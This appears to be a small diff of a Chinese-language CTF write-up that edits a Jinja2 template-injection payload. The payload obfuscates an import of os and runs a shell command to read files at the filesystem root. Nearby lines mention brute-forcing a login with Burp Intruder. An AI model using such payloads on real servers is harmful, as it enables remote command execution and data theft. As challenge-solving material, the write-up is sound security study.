@@ -27,12 +27,12 @@ username 和 password 错误时输出不同。burp 起一个 intruder 爆。
 {% endraw %}
 
 ```
-{%print(g.pop.__globals__.__builtins__.__import__('so'[::-1]).popen('nl ``/*``').read())%}
+{%print(g.pop.__globals__.__builtins__.__import__('so'[::-1]).popen('nl /*').read())%}
 ```
 
 ## 多重宇宙日记
 
-随便注册一个账号，再/profile 看到：
+随便注册一个账号，在/profile 看到：
 
 ![](/images/CuAXbUettokPfwxbAr9cvCIonGb.png)
 
